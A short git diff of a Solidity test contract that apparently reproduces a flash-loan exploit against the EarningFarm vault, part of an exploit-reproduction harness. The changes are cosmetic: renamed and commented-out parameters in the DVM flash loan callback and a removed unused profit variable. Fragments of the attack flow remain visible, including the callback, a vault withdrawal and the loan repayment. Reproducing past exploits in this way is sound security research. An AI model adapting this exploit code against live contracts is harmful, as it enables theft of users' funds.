@@ -45,9 +45,11 @@ contract Exploit_EarningFarm is TestHarness, TokenBalanceTracker, BalancerFlashl
     }
 
 
-    function DVMFlashLoanCall(address arg0, uint256 arg1, uint256 arg2, bytes memory) external {
+    // The DVM Flashloan call includes data we don't really care about for this test, comment out
+    // names so solc doesn't give us a warning
+    function DVMFlashLoanCall(address sender, uint256 /*  amount */, uint256 /*quoteAmount */, bytes memory /*data */) external {
         require(msg.sender == address(dvm), 'Only DVM');
-        require(arg0 == address(this), 'Only requested by this');
+        require(sender == address(this), 'Only requested by this');
 
         uint256 wethAmt = weth.balanceOf(address(this));
         uint256 ethBefore = address(this).balance;
@@ -93,7 +95,6 @@ contract Exploit_EarningFarm is TestHarness, TokenBalanceTracker, BalancerFlashl
         efvault.withdraw(initialEfBalance);
 
         console.log('===== STEP 6: Repay Loan =====');
-        uint256 profit = address(this).balance - ethBefore;
 
         weth.transfer(address(dvm), 100000000000000000);
         logBalancesWithLabel('Attacker Contract', address(this));
